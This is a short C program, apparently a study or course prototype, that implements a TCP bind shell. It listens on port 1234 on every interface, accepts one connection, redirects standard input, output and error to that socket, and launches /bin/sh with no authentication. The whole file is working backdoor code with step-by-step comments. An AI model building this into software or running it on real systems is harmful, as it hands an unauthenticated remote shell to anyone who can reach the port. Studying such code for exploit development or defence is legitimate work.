#include <stdio.h>
#include <strings.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define PORT 1234

int main(void) {
    
    // Create a listening socket
    int listen_sock = socket(AF_INET, SOCK_STREAM, 0);
    
    // Populate server side connection information    
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;           // IPv4
    server_addr.sin_addr.s_addr = INADDR_ANY;   // All interfaces (0.0.0.0)
    server_addr.sin_port = htons(PORT);         // Port #

    // Bind socket to local interface(s) 
    bind(listen_sock, (struct sockaddr *)&server_addr, sizeof(server_addr));

    // Start listening
    listen(listen_sock, 0);
    
    // Accept incoming connection and create socket for it 
    int conn_sock = accept(listen_sock, NULL, NULL);
    
    // Forward process's stdin, stdout and stderr to the incoming connection
    dup2(conn_sock, 0);
    dup2(conn_sock, 1);
    dup2(conn_sock, 2);
   
    // Run shell
    execve("/bin/sh", NULL, NULL);
}
